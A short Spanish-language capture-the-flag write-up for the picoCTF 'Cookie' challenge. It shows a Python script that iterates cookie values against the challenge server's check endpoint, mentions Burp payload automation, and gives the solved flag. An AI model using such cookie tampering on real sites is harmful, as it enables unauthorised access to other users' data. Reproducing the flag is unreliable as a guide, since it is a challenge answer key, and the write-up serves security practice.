# Cookie


## Descripcion
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:6418/](http://mercury.picoctf.net:6418/)
## Pistas


## Solucion
┌──(kali㉿kali)-[~]
└─$ cat exploit.py                                                
import requests

url = "http://mercury.picoctf.net:6418/check"

for i in range(21):
        cookies = {"name":f"{i}"}
        print(cookies)
        r=requests.get(url, cookies=cookies)
        print(r.text)

ejecutamos el anterior script de python hasta que nos de la bandera
o usando la herramienta burp usamos la opcion de payloads para automatizar las respuestas


## Bandera
picoCTF{3v3ry1_l0v3s_c00k135_88acab36}
## Notas adicionales


## Referencias
